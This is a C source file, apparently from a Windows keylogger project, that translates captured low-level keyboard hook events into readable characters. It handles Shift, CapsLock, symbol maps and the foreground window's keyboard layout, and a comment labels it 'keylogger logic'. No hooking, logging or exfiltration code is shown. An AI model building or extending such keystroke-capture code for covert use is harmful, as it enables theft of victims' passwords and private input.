#include <windows.h>
#include "keyboard.h"
#include "config.h"

/* Get actual key description keylogger logic */
// This function will translate a pressed key to its actual descrption.
//	The function will consider the state of special keys such as Shift, Capslock, and will translate accordingly.
//	More over, the function will take into its considiration the current keyboard state and will get the actual value of the pressed key
//	in the relevant language.
// VirtualKey Codes: https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
// Will return True if translation was made, otherwise false (for example in case of a single shift pressed)
BOOL GetActualKeyDescription(__in KBDLLHOOKSTRUCT *keyboardStruct, __in DWORD dwKeyDescriptionSize, __out LPCSTR wcKeyDescription)
{
	WCHAR wcBufferTemp[BUFFER_SIZE] = { 0 };
	DWORD lParamScanCodeWithFlags = 0;
	BOOL bIsCapslockOn = FALSE;
	BOOL bIsShiftOn = FALSE;
	DWORD vkCode = 0;

	// Unicode conversion
	DWORD dwThreadId;
	DWORD dwProcessId;
	BYTE bArrayKeyboardState[256] = { 0 }; // Will hold the key state of the keyboard (every bit represents the state of a key (pressed or not))
	WCHAR wcUnicodeChar[16] = { 0 };

	// Debug
	DebugMessage(L"KeyPressedTranslator");

	bIsShiftOn = GetAsyncKeyState(VK_SHIFT);
	bIsCapslockOn = GetAsyncKeyState(VK_CAPITAL);
	vkCode = keyboardStruct->vkCode;

	// Catch shift since we are handling this in a special way
	if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT || vkCode == VK_SHIFT)
	{
		// Shift was pressed, ignoring..
		return FALSE;
	}
	// Those keys need a special handling for Shift/Capslock (e.g. "6" --> "^", "f" --> "F")
	// NOTE: The virtualkey code of the letters ('A'-'Z') is correlated with thier ASCII value
	else if ('A' <= vkCode && vkCode <= 'Z')
	{
		// Convert to lowercase if shift or capslock is pressed.
		// If shift/capslock were pressed and another language was set as the keyboard layout, we still need to use English.
		if (!bIsShiftOn && !bIsCapslockOn)
		{
			// Shift and capslock are off. There are two options:
			//	1. Keyboard layout is set to English: In such a case we need to convert to lower case.
			//	2. Keyboard layout is set to a non-English language: In such a case we need to find the Unicode letter. 
			// In both cases we are covered. 
			//	1. For the first case - 'ToUnicodeEx' converts to the lowercase version of the English letter. So no need to 'vkCode += 32;'
			//	2. For the second case - 'ToUnicodeEx' will obviously convert to the correct unicode letter accoirding to the curent keyboard layout.

			// Get the window thread ID of the foreground window and not ours (because this is the current window that the user is activly engaging with)
			dwThreadId = GetWindowThreadProcessId(GetForegroundWindow(), &dwProcessId);
			// Get current keyboard state (the state of each key)
			GetKeyboardState(bArrayKeyboardState);
			// Convert letter to unicode, the result will be in 'wcKeyDescription'
			ToUnicodeEx(keyboardStruct->vkCode, keyboardStruct->scanCode, (BYTE*)bArrayKeyboardState, wcKeyDescription, dwKeyDescriptionSize, NULL, GetKeyboardLayout(dwThreadId));
		}
		else
		{
			// Get the ASCII value
			swprintf_s(wcKeyDescription, dwKeyDescriptionSize, L"%lc", vkCode);
		}
	}
	else if ('0' <= vkCode && vkCode <= '9')
	{
		// Convert to symbol
		if (bIsShiftOn || bIsCapslockOn)
			vkCode = cMapNumericShiftSymbols[vkCode - '0'];

		// Get the ASCII value
		swprintf_s(wcKeyDescription, dwKeyDescriptionSize, L"%lc", vkCode);
	}
	// Special keys (';', '_', etc..)
	else if (dwMapOEMSymbols1_Start <= vkCode && vkCode <= dwMapOEMSymbols1_End)
	{
		// Convert to shift symbol
		if (!bIsShiftOn)
			vkCode = cMapOEMSymbols_1[vkCode - dwMapOEMSymbols1_Start];
		else
			vkCode = cMapOEMShiftSymbols_1[vkCode - dwMapOEMSymbols1_Start];

		// Get the ASCII value
		swprintf_s(wcKeyDescription, dwKeyDescriptionSize, L"%lc", vkCode);
	}
	// Special keys ('{', ']', etc..)
	else if (dwMapOEMSymbols2_Start <= vkCode && vkCode <= dwMapOEMSymbols2_End)
	{
		// Convert to shift symbol
		if (!bIsShiftOn)
			vkCode = cMapOEMSymbols_2[vkCode - dwMapOEMSymbols2_Start];
		else
			vkCode = cMapOEMShiftSymbols_2[vkCode - dwMapOEMSymbols2_Start];

		// Get the ASCII value
		swprintf_s(wcKeyDescription, dwKeyDescriptionSize, L"%lc", vkCode);
	}
	// The default case will present us with the name of the key ("Shift", "Alt", "6", etc..)
	else
	{
		// Bit-shifitning according the the API (https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getkeynametextw)
		// bits 16 - 23		Scan code. 
		// bit	24			Extended - key flag.Distinguishes some keys on an enhanced keyboard.
		lParamScanCodeWithFlags |= (keyboardStruct->scanCode << 16) | (keyboardStruct->flags << 24);
		GetKeyNameTextW(lParamScanCodeWithFlags, wcKeyDescription, dwKeyDescriptionSize);

		// Since it's not a regular letter, we want to wrap it with and use captial ([ENTER])
		_wcsupr_s(wcKeyDescription, dwKeyDescriptionSize);		// Convert to upper case (rewritting the string)
		wcscpy_s(wcBufferTemp, BUFFER_SIZE, wcWrapperPrefix);	// prefix [
		wcscat_s(wcBufferTemp, BUFFER_SIZE, wcKeyDescription);	// Append converted uppercase string
		wcscat_s(wcBufferTemp, BUFFER_SIZE, wcWrapperSuffix);	// suffix ]
																// Copy it back to 'wcKeyDescription
		wcscpy_s(wcKeyDescription, dwKeyDescriptionSize, wcBufferTemp);
	}

	return TRUE;
}

/*********************************/

